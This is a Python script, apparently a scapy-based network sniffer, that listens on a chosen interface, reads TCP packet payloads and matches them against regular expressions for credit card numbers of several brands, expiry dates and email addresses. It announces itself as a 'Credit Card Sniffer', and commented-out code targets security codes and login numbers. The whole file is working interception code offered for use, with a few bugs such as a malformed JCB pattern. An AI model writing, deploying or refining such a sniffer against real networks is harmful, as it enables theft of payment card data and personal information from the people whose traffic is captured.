import re
import optparse
from scapy.all import *

def FindCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall('3[4-7][0-9]{13}', raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
    dinerRE = re.findall('^3(?:0[0-5]|[68][0-9])[0-9]{11}', raw)
    discoverRE = re.findall('6(?:011|5[0-9]{2})[0-9]{12}', raw)
    jcbRE = re.findall('^(?:2131|1800\35\d{3})\d{11}', raw)
    #securitycodeRE = re.findall("3[0-6][0-9]", raw)
    expdateRE = re.findall("[0-9][0-9]+/[0-9][0-9]", raw)
    #userlogRE = re.findall("[000|0000][0-9]{5,10}", raw)
    emailRE = re.findall("[a-zA-Z0-9._+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9.-]{2,}", raw)

    if americaRE:
        print ("[+] Found American Express Card: ") + americaRE[0]

    if masterRE:
        print ("[+] Found MasterCard Card: ") + masterRE[0]

    if visaRE:
        print ("[+] Found VisaCard Card: ") + visaRE[0]

    if dinerRE:
        print ("[+] Found Diners Card: ") + dinerRE[0]

    if discoverRE:
        print ("[+] Found Discover Card: ") + discoverRE[0]

    if jcbRE:
        print ("[+] Found JCB Card: ") + jcbRE[0]

    #if securitycodeRE:
        #print ("[+] Found Security Code: ") + securitycodeRE[0]

    if expdateRE:
        print ("[+] Found Expiry Date of Card: ") + expdateRE[0]

    #if userlogRE:
        #print ("[+] Found User Login Number: ") + userlogRE[0]

    if emailRE:
        print ("[+] Found Email Address: ") + emailRE[0]

def main():
    parser = optparse.OptionParser('usage % prog -i<interface>')
    parser.add_option('-i', dest='interface', type='string',\
        help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print(parser.usage)
        exit(0)
    else:
        conf.iface = options.interface
    try:
        print ('[*] Starting Credit Card Sniffer..\n[*] Starting Security Code Sniffer..\n[*] Starting User Sniffer..\n[*] Starting Email Sniffer..')
        sniff(filter='tcp', prn=FindCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
